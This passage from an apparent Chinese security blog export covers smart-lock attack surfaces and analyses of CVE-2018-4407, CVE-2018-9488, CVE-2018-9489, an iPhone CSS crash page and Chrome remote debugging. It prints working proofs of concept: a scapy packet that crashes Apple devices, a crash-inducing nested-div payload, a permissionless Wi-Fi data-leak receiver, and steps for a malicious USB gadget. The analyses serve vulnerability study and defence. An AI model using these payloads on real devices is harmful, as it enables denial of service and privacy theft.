    <content type="text"><![CDATA[本文搜集所有和只能门锁相关的漏洞、设计、案例等。本文大部分内容来自CNCERT发布的《智能门锁网络安全分析报告》，结合其他资料作的搜集，作为日后智能门锁安全的wiki。 一、门锁设计相关两种架构：门锁直接联网、门锁通过手机联网 四种角色：主人、长期居住、重复访客、临时访客 门锁的交互介质：蓝牙、NFC、RFID、WiFi、数据流量 二、几种开锁的方式以及攻击面1.固定密码开锁实现机制：安装时先进行门锁初始化，并完成密码设置，该密码存储在智能门锁的固态存储空间，有时也可能会上传到云端进行存储。在用户开锁时，在门锁上输入密码，如果输入的密码与预先设置的密码一致，则可打开门锁。（该模式本质上相当于用密码去登录一个账户） 攻击面暴力破解、密码重置漏洞、按键痕迹残留、默认密码、后门密码等 漏洞案例暂无 2.临时密码开锁实现机制户主会通过手机APP从云端获取当前时段开锁的临时密码，并通过短信、微信或者手机APP等方式将临时密码发送给访客。访客在门锁上输入接收到的临时密码后，门锁会将该密码与云端自动生成的当前时段临时密码进行对比，如果成功，则开锁。 攻击面临时密码有效期、临时密码泄露、 漏洞案例3.生物信息开锁实现机制生物特征主要有指纹、掌纹、虹膜和人脸等。该类门锁在安装的过程中，会将指纹、掌纹、虹膜和人脸等生物特征初始化到智能门锁固态存储或者云端。用户开锁时，门锁需要采集用户的指纹、掌纹、虹膜和人脸特征，并传统到云端与初始化特征进行对比，如果对比成功，则开锁。 攻击面指纹泄露、指纹残留、人脸（图片）、 漏洞案例4.智能卡开锁实现机制用于智能门锁开锁的智能卡主要有RFID卡、NFC卡和CPU卡三类，该类门锁主要应用在酒店和公寓等场景。 使用RFID卡的门锁，门禁管理系统会在RFID卡中写入代表该卡身份的字符串，在开锁时，门锁提取RFID卡中的字符串，并传输到云端进行对比，对比成功，则开锁。 使用NFC卡和CPU卡的门锁，门禁管理系统会在NFC卡和CPU卡中写入代表该卡身份的私钥和公钥，在开锁时，该卡通过门锁与云端进行双向身份认证，如果认证成功，门锁接收到云端的开锁指令，打开门锁。 攻击面卡片复制、未设置滚动码 漏洞案例 华马智能门锁存在硬件漏洞（无线重放） http://www.cnvd.org.cn/flaw/show/CNVD-2018-02695 微耕遥控智能锁系统存在设计漏洞（wifi重放） http://www.cnvd.org.cn/flaw/show/CNVD-2016-12586 5.手机APP或小程序开锁实现机制在初始化的过程中，云端会将门锁与指定手机上的APP进行绑定。在用户开锁时，用户在手机APP上完成身份认证，然后在手机上点击开锁按钮，智能门锁就会接收到云端下发的开锁指令，然后打开门锁。 攻击面APP漏洞、重放攻击 漏洞案例6.近场通信开锁实现机制WIFI、NB-IoT、ZigBee、蓝牙等通信方式的攻击 攻击面信号重放、短距离内挟持、靠近时自动开锁 漏洞案例三、通用性攻击面1.无线馈电攻击一些智能门锁由于设计缺陷，在布线及电路设计时没有考虑电磁干扰问题。攻击者可以利用特斯拉线圈通过无线电波干扰，使得智能门锁的内部电路产生直流馈电，可能产生两种效果： 利用智能门锁电路的馈电系统驱动电流打开门锁 产生强电磁脉冲攻击智能门锁芯片，会造成芯片死机并重启，有的智能门锁默认重启后会自动开锁 漏洞案例： 参考一篇文章《那个女人毁了整个指纹锁行业》 2.APP或小程序逻辑漏洞绝大多数只能门锁厂商都会开发对于的APP或小程序，由于这些厂商非软件产商，更多的会专注于功能实现，而忽略了安全性。可能存在的风险有： APP代码中或者固件中使用固定的加解密密钥 本地逻辑绕过开锁 移动端APP和设备之间的认证漏洞 明文传输 漏洞案例 松下智能锁安卓App存在任意密码重置漏洞 http://www.cnvd.org.cn/flaw/show/CNVD-2017-03908 某智能门锁二度分析感悟 https://paper.seebug.org/343/ 3.云端漏洞 用户身份鉴别漏洞 未限制密码复杂度 未限制非法登陆次数 重置密码的短信验证码由本地产生或者存在于返回数据包中 访问控制漏洞 横向越权 纵向越权 云管理平台系统存在web漏洞 常见的web安全漏洞同样存在于智能门锁云管理平台，例如，SQL注入、任意文件上传、失效的身份验证和回话管理、跨站脚本攻击、不安全的直接对象引用、安全配置错误、敏感信息泄露、功能级访问控制缺失、跨站请求伪造、使用含有已经存在漏洞的组件和未验证的重定向和转发等漏洞。 4.固件漏洞 固件提取、逆向分析 固件未签名，中间人攻击更新 参考资料 CNCERT：智能门锁网络安全分析报告 https://mp.weixin.qq.com/s?__biz=MzUzNDYxOTA1NA%3D%3D&amp;mid=2247486313&amp;idx=1&amp;sn=adf4560cfceca1e996cbf173e5bb415f&amp;scene=45#wechat_redirect Smart Locks: Lessons for Securing Commodity Internet of Things Devices https://www2.eecs.berkeley.edu/Pubs/TechRpts/2016/EECS-2016-11.pdf 智能锁安全漏洞自查手册 http://www.pieeco.com/news/3023_1.html 如何通过手机搞定蓝牙门锁 https://www.anquanke.com/post/id/87128]]></content>
  </entry>
  <entry>
    <title><![CDATA[远程打挂所有的apple设备 — CVE-2018-4407分析]]></title>
    <url>%2F2018%2F11%2F01%2F%E8%BF%9C%E7%A8%8B%E6%89%93%E6%8C%82%E6%89%80%E6%9C%89%E7%9A%84apple%E8%AE%BE%E5%A4%87-CVE-2018-4407-%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[简述Kevin Backhouse 发现了一个iOS和mac OS的内核漏洞 —— CVE-2018-4407，该漏洞出现在XNU内核中，可以远程攻击使所有的apple设备挂掉。 漏洞演示demo：https://www.youtube.com/watch?v=aV7yEemjexk 漏洞已经上报给了Apple并在iOS12（9月17日）和macOS Mojave（9月24日）系统更新中已经修复完成。该漏洞影响以下版本的设备： iOS 11以及之前的所有设备 (upgrade to iOS 12) macOS High Sierra 10.13.6以及以下所有设备(patched in security update 2018-001) macOS Sierra 10.12.6以及之前所有的设备(patched in security update 2018-005) OS X El Capitan以及之前所有设备 漏洞分析漏洞出现在icmp_error代码中, (bsd/netinet/ip_icmp.c:339): 我们知道，ICMP报文主要有两大功能：查询报文和差错报文。在互联网传输过程中，IP数据报难免会出现差错，通常出现差错时处理方法就是丢弃，但一般出现差错后，接收方会发送ICMP报文给主机，告诉它一些差错信息，而icmp_error就是这一部分的实现。 产生漏洞的代码为：1m_copydata(n, 0, icmplen, (caddr_t)&amp;icp-&gt;icmp_ip); m_copydata为一个简单的指定长度的数据拷贝，其实现如下： icmp_error中的m_copydata是将出错ip数据包的包头复制到icmp的消息体中，其中n为接收到的出错的ip数据包，icp-&gt;icmp_ip为要拷贝的目的地址，如果n的包头过大，超过了icp分配的长度，则会发生溢出。 下面来跟踪一下icp: 1icp = mtod(m, struct icmp *); mtod是一个宏定义, 意思是将一个mbuf指针转为对应类型的指针，由此可见这里icp是一个icmp结构体指针 继续跟踪m:12345678struct mbuf *m;...icmplen = min(oiphlen + icmpelen, min(nlen, oip-&gt;ip_len));if (MHLEN &gt; (sizeof(struct ip) + ICMP_MINLEN + icmplen)) m = m_gethdr(M_DONTWAIT, MT_HEADER); /* MAC-OK */else m = m_getcl(M_DONTWAIT, MT_DATA, M_PKTHDR); 由此可见m为要发出去的数据包，它的大小由m_gethdr或m_getcl来分配。 此时，再回过头来看一下m_copydata:1m_copydata(n, 0, icmplen, (caddr_t)&amp;icp-&gt;icmp_ip); 如上文所述，n指向接收到的数据包，icp指向一个icmp结构体，是由出站数据包m转换过来，icp-&gt;icmp_ip为icp+8字节偏移。如果icmplen的长度过大，就会出现溢出。 icmplen的赋值代码如下：1234567891011121314151617181920212223if (oip-&gt;ip_p == IPPROTO_TCP) &#123; struct tcphdr *th; u_int16_t tcphlen; if (oiphlen + sizeof(struct tcphdr) &gt; n-&gt;m_len &amp;&amp; n-&gt;m_next == NULL) goto stdreply; th = (struct tcphdr *)(void *)((caddr_t)oip + oiphlen); tcphlen = th-&gt;th_off &lt;&lt; 2; if ((oiphlen + tcphlen) &gt; n-&gt;m_len &amp;&amp; n-&gt;m_next == NULL) goto stdreply; icmpelen = max(tcphlen, min(icmp_datalen, (oip-&gt;ip_len - oiphlen))); &#125; elsestdreply: icmpelen = max(ICMP_MINLEN, min(icmp_datalen, (oip-&gt;ip_len - oiphlen))); icmplen = min(oiphlen + icmpelen, min(nlen, oip-&gt;ip_len)); 经过作者测试，icmplen大于等于84即可发生溢出，另外由于代码执行到这里需要满足oip-&gt;ip_p == IPPROTO_TCP，因此我们需要构造一个IP+TCP的数据包，并且长度大于84即可。 讲到这里，要怼一下某些带“Ping死你！”的翻译文章标题，漏洞的原理是:接收方收到一个畸形tcp包后，会生成一个ICMP包告知发送方出错，溢出出现在生成ICMP包的逻辑中，并不是由ping导致，所以“ping死你”明显是标题党啊。。。 PoC如下:12$sudo scapy&gt;&gt;send(IP(dst=&quot;192.168.1.151&quot;,options=[IPOption(&quot;A&quot;*8)])/TCP(dport=8888,options=[(19, &quot;1&quot;*33)])) 防护方案由于该漏洞只需要在同一个局域网内就可以远程攻击，因此杀伤力巨大。除了星巴克等公共wifi可作为攻击环境外，用SIM卡上网的手机本质上也处在一个巨大的局域网中，都有可能被远程攻击，因此有必要对自己的设备进行防护，升级到最新的系统。 mac如不想升级系统，可在设置- 安全性与隐私 - 防火墙选项中，启用隐身模式，如下图： iOS设备无法通过类似方式防御，只能更新到最新系统。 参考资料： https://twitter.com/kevin_backhouse/status/1057352656560287746 https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407]]></content>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-9488 - 从zygote到init]]></title>
    <url>%2F2018%2F09%2F17%2FUSB%E6%94%BB%E5%87%BBandroid%E6%89%8B%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[概述上一篇文章中利用cve-2018-9445实现了Android系统在mount外设时的目录穿越CVE-2018-9445 —— Android挂载外设的目录穿越，由于字符长度限制，只有5个字符可控，利用极其有限。 PJ0的Jann Horn，也就是漏洞的原作者对该漏洞进一步分析，发现了更精巧的利用方法，能够基于该漏洞进一步从zygote提权到init，Goole为这一新的利用分配了新的cve编号 —— CVE-2018-9488。 漏洞分析cve-2018-9445能够利用的前提是USB设备有MBR分区表，且格式为vfat，这样内核的vfat文件系统才会mount。此外，如需进一步利用，还需要绕过以下几种安全措施： 路径穿越5个字符的限制 SELinux限制了vold进程的操作 权限限制，如果目录权限不是0700，fs_prepare_dir和chmod会失败 vfat文件系统限制。vfat格式的U盘被mount后，所有文件会被标记为u:object_r:vfat:s0，这意味着即使mount后的目录为/system或/data等一些系统级别的目录，SELinux Context下的进程（如zygote和system_server）是无法和其交互的。 media_rw组的进程需要绕过DAC检测 漏洞利用1.伪造一个USB设备如上篇文章所述，blkid支持各种不同的文件系统，在解析文件头得到type, label和 UUID之后，fsck_msdos会再次读取文件，检测文件系统是否为vfat格式，我们只需要构造一个动态可控的USB设备使系统在两次读取信息时，返回不同的值即可满足这两种条件。即blkid在读取时，构造一个长字符串的label,使blkid认为是romfs格式；fsck_msdos在读取时，再修改自己成为一个vfat格式的USB设备。 这里使用一个树莓派Zero W去构造一个USB Gadget实现上述功能，USB Gadget实现了 USB 协议定义的设备端的软件功能，Linux 中一切皆文件，因此通过配置一些参数如设备类型，序列号等，就可以被操作系统识别为一个“真实的”USB设备。参考Make your own USB gadget”。 注意之所以使用Zero W是因为其支持USB device模式，Zero W有两个MicroUSB接口，分别用来供电和传输数据，市面上稍早些的树莓派，比如树莓派2B，树莓派3等，它们都只支持作为 Host。 为了实现目的，我们使用FUSE来实现辅助构造一个USB设备。 FUSE即用户空间文件系统（Filesystem in Userspace），通过FUSE可以修改文件系统读取属性，以实现不同条件下的读取返回不同的内容，核心代码如下：1234567static int readdir(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi) &#123; backing_fds[STATE_BLKID] = open(&quot;disk_image_blkid&quot;, O_RDWR); backing_fds[STATE_MOUNT] = open(&quot;disk_image_mount&quot;, O_RDWR); if (offset == 0 &amp;&amp; size == 0x1000) switch_to_fd_idx(STATE_BLKID); if (offset == 0x0011e000 &amp;&amp; size == 0x2000) switch_to_fd_idx(STATE_MOUNT); ... &#125; 这里构造了两个image,第一个imgae为romfs格式，这里命名为”disk_image_blkid”，通过命令修改其label值以触发漏洞。1# echo -e &apos;-rom1fs-########TYPE=&quot;vfat&quot; UUID=&quot;../../data&quot;\0&apos; &gt; /dev/sdd1 第二个image为vfat格式，这里命名为”disk_image_mount”，放入需要替换的文件。 编译fuse_intercept.c1gcc -Wall fuse_intercept.c `pkg-config fuse --cflags --libs` -o fuse_intercept 新建一个目录”mount”，并在控制台中运行fuse_intercept。 在另一个控制台运行12sudo modprobe dwc2sudo modprobe g_mass_storage file=/home/pi/mount/wrapped_image stall=0 告诉内核将mount目录作为一个usb设备。 2.绕过SELinux即使成功的利用漏洞monut到了/data目录，由于Android的一些安全限制，很多代码是无法访问mount的文件系统的。 基于Android的访问限制，代码访问mount文件系统需要绕过DAC和SELinux两种限制: DAC (默认mount的文件属性为media_rw组) SELinux （zygote和system_server中的代码无权限加载mount的文件，所有文件为u:object_r:vfat:s0） 事实上我们挂载的vfat文件系统由于是被动挂载，无法修改文件属性和绕过SELinux限制，利用上述的目录穿越漏洞，除了覆盖一些文件外，是无法实现代码执行的。 为了实现代码执行，必须切换一下思路。我们知道Android(Linux)的分区是通过mount实现的，既然我们mount的文件无法绕过DAC和SELinux，那么系统mount的文件是如何实现的呢？这就引出了一个新的利用思路：PrivateVolume。 Android系统的vold支持两种形式的USB —— PublicVolume和PrivateVolume(也就是外部存储和内部存储)，之前的漏洞利用我们一直基于PublicVolume，然而vold还可以挂载为PrivateVolume。PrivateVolume有一个很重要的特点就是可以控制文件的SELinux标签，这是因为PrivateVolume属于ext4文件格式，而ext4是支持修改SELinux的。因此如果能挂载为PrivateVolume，我们就可以绕过SELinux检测，进而实现代码执行。 挂载成为PrivateVolume需要一些条件：PrivateVolume是由dm-crypt-encrypted加密的ext4文件系统，PrivateVolume必须为GPT分区格式，且包含一个独特的UUID kGptAndroidExpand (193D1EA4-B3CA-11E4-B075-10604B889DCF)。key保存在/data/misc/vold/expand_{partGuid}.key这个路径，其中{partGuid}为GPT分区的GUID。 正常情况下攻击者不可能挂载一个PrivateVolume，因为手机上没有这个key,即使有，我们也不知道具体的GUID。但是攻击者可以利用之前的目录穿越漏洞覆盖/data/misc 目录，把自己的key和GUID预置在那里。 这里有人可能会质疑，这个key文件难道没有SELinux限制么？这是因为挂载是由vold进程实现的，正如本节开头所述，vold进程是用来处理mount事件的，因此vold是有权限访问的。 本节通过挂载成为PrivateVolume，我们可以绕过DAC和SELinux限制，进而实现代码执行。 3.注入Zygote绕过了DAC和SELinux限制，那么如何实现代码执行呢？通过利用漏洞覆盖/data,我们可以替换一些高权限进程加载的第三方库，进而注入我们自己的代码。 zygote进程具有很高的权限，可以任意修改自己的UID和context,几乎可以访问所有的user数据。zygote在启动时，会加载/data/dalvik-cache/arm64/system@framework@boot*.{art,oat,vdex}三个文件，其中oat和vdex为/system分区的软连接，oat为一个elf文件。 我们在mount到/data目录时，为保证zygote运行，需要准备这3个文件，其中oat和vdex直接设置为对应的软连接即可，对于oat文件，在attribute((constructor))函数中注入我们的代码，这样只要dlopen()加载oat文件时便会执行我们的代码。 到目前为止我们实现了Zygote进程的代码执行，但只是理论上实现，因为Zygote只要在启动时才会加载这些第三方库，而我们的漏洞在触发时，Zygote已经运行起来了，因此我们需要让Zygote再加载一次。 4.Crash system_server为了实现Zygote重新加载一次，重启手机显然是不行的，Zygote倒是重新加载了，但vold进程也会重启，意味着我们漏洞利用也重新来过。因此只能采取软重启，但又保持vold进程不变的方式，来重启Zygote进程。 Android中有一段用来跟踪宽带占用的代码，这段代码会不断的向/data分区写入数据，但超过2M的数据（mPersistThresholdBytes）写入失败时，就会导致system_server重启，也就意味着Zygote会重启。 利用这个逻辑，我们可以使用Ping flood来触发Zygote重启。 使用Ping flood需要基于一个前提，即被攻击设备连接到我们控制的网络中，这有两种办法可以实现： Android 9.0之前，在锁屏界面是可以控制手机连接到一个无需密码的wifi，以Pixel为例，只需要下滑屏幕，点击wifi图标下的小三角即可选择要连接的wifi。 在手机上插一个USB无线网卡 上述两种办法都可以实现利用Ping flood来crash system_server。 到目前为止，我们漏洞利用做到了Zygote下的代码执行，Android中的应用都是由Zygote进程孵化而来，因此目前的漏洞利用代码可以访问所有的用户数据，但zygote毕竟权限有限，如不能打开一些块设备文件、访问部分内存空间受限等等，为了扩大化攻击，我们需要进一步提权。 5.从zygote到vold早期的Android通过一个高权限的守护进程来生成crash dump文件，现在的andorid采用/system/bin/crash_dump64和/system/bin/crash_dump32来生成crash dump文件，这两个文件的SELinux标签为u:object_r:crash_dump_exec:s0，当这个标签的文件任何SELinux domain执行时，其context都会变为crash_dump domain。 crash_dump 的SELinux策略如下：123456789101112https://android.googlesource.com/platform/system/sepolicy/+/a3b3bdbb2fdbb4c540ef4e6c3ba77f5723ccf46d/public/crash_dump.te:[...]allow crash_dump &#123; domain -init -crash_dump -keystore -logd&#125;:process &#123; ptrace signal sigchld sigstop sigkill &#125;;[...]r_dir_file(crash_dump, domain)[...] 这个策略允许crash_dump通过ptrace去attach绝大多数其他进程，包括vold进程，因此如果我们在crash_dump context下就可以通过attach拿到了vold进程权限。 到这里也许我们想把一个预置一个带u:object_r:crash_dump_exec:s0标签的文件，然后去执行它，进而转移到crash_dump domain，然而这是行不通的。这是因为vold在mount时对文件做了权限降级，无法实现SELinux domain transitions。 因此，现在只能通过注入代码到crash_dump64，我们使用unshare（）创建一个新的挂载点，然后调用pivot_root（）将根目录指向一个我们完全可控的目录，之后再执行crash_dump64。这样kernel会解析crash_dump64的文件头，获取linker的路径(/system/bin/linker64)，并从这个路劲加载linker并执行，如果这个linker是我们自己实现的，这个过程就会执行我们的代码。之后，我们的代码再通过attach到vold进程，拿到vold进程的执行权限。 6.从vold到init context到这里为止我们已经通过attach的方式控制了vold进程，作者又从vold提权到init context,注意这里是context，并非init进程。通过查找代码中所有能转为init contect的SELinux策略，发现kernel context可以转为init context:12https://android.googlesource.com/platform/system/sepolicy/+/master/private/kernel.te:domain_auto_trans(kernel, init_exec, init) 这意味着如过kernel context的代码执行一个带有init_exec标签的文件，这个文件的context将变为init context。 运行在kernel context的代码只能是kernel层了，即我们需要想办法让kernel执行一个带init_exec的文件。作者进一步发现当查找一个不存在的key时（例如调用request_key()），/sbin/request-key文件将会被kernel调用，所以利用之前的漏洞，我们替换/sbin目录，并预置我们自己构造的request-key，在获得vold执行权限后，调用request_key(),这时候kernel会调起我们构造的request-key，进而变为init context。 7.从init context到kernel理论上从init context还可以进一步提权到kernel权限，但作者到这一步便没有再进行研究。 通过查找源码中的domain_trans，发现init context可以转为modprobe或vendor_modprobe12domain_trans(init, &#123; rootfs toolbox_exec &#125;, modprobe)domain_trans(init, vendor_toolbox_exec, vendor_modprobe) modprobe或vendor_modprobe有加载kernel module的权限：1234allow modprobe self:capability sys_module;allow modprobe &#123; system_file &#125;:system module_load;allow vendor_modprobe self:capability sys_module;allow vendor_modprobe &#123; vendor_file &#125;:system module_load; Android目前对kernel modules的加载还没有签名验证：1234567891011121314walleye:/ # zcat /proc/config.gz | grep MODULECONFIG_MODULES_USE_ELF_RELA=yCONFIG_MODULES=y# CONFIG_MODULE_FORCE_LOAD is not setCONFIG_MODULE_UNLOAD=yCONFIG_MODULE_FORCE_UNLOAD=yCONFIG_MODULE_SRCVERSION_ALL=y# CONFIG_MODULE_SIG is not set# CONFIG_MODULE_COMPRESS is not setCONFIG_MODULES_TREE_LOOKUP=yCONFIG_ARM64_MODULE_CMODEL_LARGE=yCONFIG_ARM64_MODULE_PLTS=yCONFIG_RANDOMIZE_MODULE_REGION_FULL=yCONFIG_DEBUG_SET_MODULE_RONX=y 因此，在init context下执行一个文件变为modprobe context，进而加载一个kernel module可以提权到kernel权限。 总结这套利用可谓是极其精巧，把一个简单的目录穿越变为了kernel下的代码执行。我总结了漏洞利用过程中几个关键的节点，如下图： 完成这套利用需要对Android的文件系统、DAC和SELinux有很深的理解，每一个关键环节都能看出作者扎实的基础和功底，是我们学习的榜样！ 参考资料 https://googleprojectzero.blogspot.com/2018/09/oatmeal-on-universal-cereal-bus.html https://bugs.chromium.org/p/project-zero/issues/detail?id=1583 (“directory traversal over USB via injection in blkid output”) https://bugs.chromium.org/p/project-zero/issues/detail?id=1590 (“privesc zygote-&gt;init; chain from USB”) 使用树莓派 Zero 实现带回显的新型 Bad USB http://shumeipai.nxez.com/2018/06/26/using-raspberry-pi-zero-to-implement-new-bad-usb-with-echo.html FUSE http://man7.org/linux/man-pages/man4/fuse.4.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[iPhone打开某网站重启分析]]></title>
    <url>%2F2018%2F09%2F17%2FiPhone%E6%89%93%E5%BC%80%E6%9F%90%E7%BD%91%E7%AB%99%E9%87%8D%E5%90%AF%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[概述使用iPhone打开https://xssle.com/ios/ 这个网站，手机就会重启，此外在mac上用Safari浏览器打卡也会陷入卡顿，但不至于重启。 网页分析该网页的源码如下： 可以看到网页由几部分组成： 一张背景图片不断重复 3000多个div嵌套 每个div设置了backdrop-filter、-webkit-backdrop-filter属性 通过精简测试，发现背景图片不影响crash，故能造成iPhone crash的核心代码为：12345678&lt;html&gt;&lt;style&gt; div&#123; backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); &#125;&lt;/style&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt; ..... &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt; crash分析查看log发现crash log类型为unknown： kernel打印出一堆奇怪的东西： 推测应该是webkit占用了过多的内核资源 历史上的iPhone crash事件 2018年5月，点击黑点表情卡死https://baijiahao.baidu.com/s?id=1600048067011062679&amp;wfr=spider&amp;for=pc 影响iOS 10/11 2018年1月 chaiOS bug https://www.idownloadblog.com/2018/01/18/a-fix-for-chaios-messages-bug-will-arrive-next-week/ 影响 iOS 10 - 11.2.5 2017年1月，发送“白旗+0+彩虹”表情卡死https://www.leiphone.com/news/201701/GDXeBJxyggxGoe7O.html iOS 10.0到10.2.1 2017年5月，gif导致iPhone重启https://www.leiphone.com/news/201705/pUQ6Rzdo26OHWgm7.html 2016年，一段美拍视频导致iPhone崩溃https://www.zhihu.com/question/51630274 2015年5月，“Effective Power” Unicode解码https://metro.co.uk/2015/05/27/theres-a-way-of-crashing-someones-iphone-with-a-text-message-5217671/ 参考资料： https://www.bleepingcomputer.com/news/security/new-css-attack-restarts-an-iphone-or-freezes-a-mac/ https://gist.github.com/pwnsdx/ce64de2760996a6c432f06d612e33aea]]></content>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-9489分析]]></title>
    <url>%2F2018%2F09%2F07%2FCVE-2018-9489%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[概述CVE-2018-9489是一个很简单，很鸡肋的漏洞，但漏洞无贵贱，在一些特殊的场景中往往会利用这些漏洞完成不可思议的利用。 简而言之，CVE-2018-9489这个漏洞就是一个0权限的app可以读到系统的mac地址、wifi信息，而这些信息如果是一个普通的app去读取的话是需要申请权限的。 CVE-2018-9489漏洞通过监听NETWORK_STATE_CHANGED_ACTION和WIFI_P2P_THIS_DEVICE_CHANGED_ACTION这两个广播来获得这些信息。 漏洞分析Android系统通过WifiManager.NETWORK_STATE_CHANGED_ACTION和WifiP2pManager.WIFI_P2P_THIS_DEVICE_CHANGED_ACTION这两个广播发送系统的MAC地址、BSSID、wifi名称、IP地址、DNS等信息。 正常情况下，通过WifiManager类访问这些信息时，需要注册“ACCESS_WIFI_STATE”权限。我们知道搜集了mac地址和BSSID信息时，就可以进行wifi定位，而正常的wifi定位时需要注册“ACCESS_FINE_LOCATION” 和 “ACCESS_COARSE_LOCATION”权限的。 此外，Android为了数据隐私，从这个6.0版本开始， Android 移除了通过 WiFi 和蓝牙 API 来在应用程序中可编程的访问本地硬件标示符。现在 WifiInfo.getMacAddress() 和 BluetoothAdapter.getAddress() 方法都将返回 “02:00:00:00:00:00”。 然而通过监听系统广播的方式，一个普通App可以不用申请任何权限去获得这些信息。当然，如上所述，利用CVE-2018-9489可以进行wifi定位、读取MAC地址、内网扫描等。 PoC代码12345678910111213141516171819202122232425262728293031323334353637protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); BroadcastReceiver receiver = new BroadcastReceiver() &#123; @Override public void onReceive(Context context, Intent intent) &#123; Log.d(&quot;m4bln&quot;, intent.getAction()); String extrasString = &quot;&quot;; Bundle extras = intent.getExtras(); if (extras != null) &#123; Set&lt;String&gt; keySet = extras.keySet(); for (String key : keySet) &#123; try &#123; String extraValue = intent.getExtras().get(key).toString(); extrasString += key + &quot;: &quot; + extraValue + &quot;\n&quot;; &#125; catch (Exception e) &#123; Log.d(&quot;m4bln&quot;, &quot;Exception in getExtras: &quot; + e.toString()); extrasString += key + &quot;: Exception:&quot; + e.getMessage() + &quot;\n&quot;; &#125; &#125; &#125; Log.d(&quot;m4bln&quot;, extrasString); &#125; &#125;; IntentFilter filter = new IntentFilter(); filter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION); filter.addAction(WifiP2pManager.WIFI_P2P_THIS_DEVICE_CHANGED_ACTION); registerReceiver(receiver, filter);&#125; 读到的广播数据如下： 该漏洞在Android 9.0修复，但由于音响范围较小，之前的版本Android不作处理。 参考资料： https://wwws.nightwatchcybersecurity.com/2018/08/29/sensitive-data-exposure-via-wifi-broadcasts-in-android-os-cve-2018-9489/]]></content>
  </entry>
  <entry>
    <title><![CDATA[Chrome远程调试]]></title>
    <url>%2F2018%2F09%2F01%2F%E8%B0%83%E8%AF%95%E7%A0%94%E7%A9%B6%2F</url>
    <content type="text"><![CDATA[远程调试Chrome的调试目标主要分两种：Chrome PC 浏览器和 Chrome Mobile 调试PC端chrome除了使用“审查元素”外，还可以用一个进程的chrome调试另一个进程的chrome。利用命令行启动chrome，并开启调试端口即可：1sudo /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=2333 需要注意被调试端暴露的端口只接受来自127.0.0.1 或者localhost 的端口请求。 调试Android端chrome调试Android端Chrome需要: adb连接（USB线连接或adb网络调试） 手机端webview需要打开调试模式1webview.setWebContentsDebuggingEnabled(true) 满足上述2点后，在PC上的chrome中输入chrome://inspect或about://inspect,即可进入调试界面。 调试实现Chrome的调试本质上通过端口来实现，PC端chrome在开启调试模式时会指定端口，Android端通过adb forward来实现：1adb forward tcp:2333 localabstract:webview_devtools_remote_6784 被调试的webview在手机上创建一个Unix Domain Socket, 这个socket的名字为 webview_devtoolsremote,其中pid为webview所处的进程号，执行adb forward命令后，adb将这个Unix Domain Socket转发到PC上一个本地端口，进而实现了调试。 调试权限Google 为了限制调试端口的接入范围，对于 Chrome PC 浏览器，调试端口只接受来自 127.0.0.1 或者 localhost 的数据请求，所以，无法通过你的本地机器 IP 来调试 Chrome。 对于 Android Chrome/WebView，调试端口只接受来自于 shell 这个用户数据请求，也就是说只能通过 USB 进行调试，或者通过adb网络连接调试。 为了测试这一点，我们通过本地socket连接Unix Domain Socket进行了实验验证：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stddef.h&gt;#include &lt;sys/un.h&gt;#include &lt;sys/socket.h&gt;void send_remote_request(char *msg)&#123; int localsocket, len; struct sockaddr_un remote; if ((localsocket = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) &#123; exit(1); &#125; char *name=&quot;webview_devtools_remote_6784&quot;;//与java上层相同哦 remote.sun_path[0] = &apos;\0&apos;; /* abstract namespace */ strcpy(remote.sun_path+1, name); remote.sun_family = AF_UNIX; int nameLen = strlen(name); len = 1 + nameLen + offsetof(struct sockaddr_un, sun_path); if (connect(localsocket, (struct sockaddr *)&amp;remote, len) == -1) &#123; printf(&quot;connect error\n&quot;); return; &#125; if (send(localsocket, msg, strlen(msg),0) == -1) &#123; printf(&quot;send error\n&quot;); return; &#125; char buf[1024]; if (recv(localsocket,buf,1024, 0) == -1)&#123; printf(&quot;rece error\n&quot;); return; &#125; printf(&quot;received: %s&quot;,buf); close(localsocket);&#125;int main()&#123; char *http=&quot;GET /json/version HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: curl/7.54.0\r\nAccept: */*\r\n\r\n&quot;; send_remote_request(http);&#125; 上述代码编译的程序在uid=0(root权限)运行时，会受到返回socket数据： 在其他权限执行时，socket会连接错误： 请求调试端口通过以上的调试方式的接入以及调试端口的打开，这个时候在浏览器中请求127.0.0.1:2333，可以看到以下内容：12345678910[ &#123; &quot;description&quot;: &quot;&#123;\&quot;attached\&quot;:true,\&quot;empty\&quot;:false,\&quot;height\&quot;:1055,\&quot;screenX\&quot;:0,\&quot;screenY\&quot;:210,\&quot;visible\&quot;:true,\&quot;width\&quot;:845&#125;&quot;, &quot;devtoolsFrontendUrl&quot;: &quot;http://chrome-devtools-frontend.appspot.com/serve_rev/@8daf58f7f40d22013c59388236c8e71e1117cb2c/inspector.html?ws=127.0.0.1:2333/devtools/page/0F8BF00855E9F57A1D62802C1882DE05&quot;, &quot;faviconUrl&quot;: &quot;http://mat1.gtimg.com/www/icon/favicon2.ico&quot;, &quot;id&quot;: &quot;0F8BF00855E9F57A1D62802C1882DE05&quot;, &quot;title&quot;: &quot;腾讯首页&quot;, &quot;type&quot;: &quot;page&quot;, &quot;url&quot;: &quot;http://www.qq.com/&quot;, &quot;webSocketDebuggerUrl&quot;: &quot;ws://127.0.0.1:2333/devtools/page/0F8BF00855E9F57A1D62802C1882DE05&quot;&#125; ] 其中，最重要的 2 个参数分别是 id 和 webSocketDebuggerUrl。 Chrome 会为每个页面分配一个唯一的 id，作为该页面的唯一标识符。几乎对目标浏览器的所有操作都是需要带上这个 id。 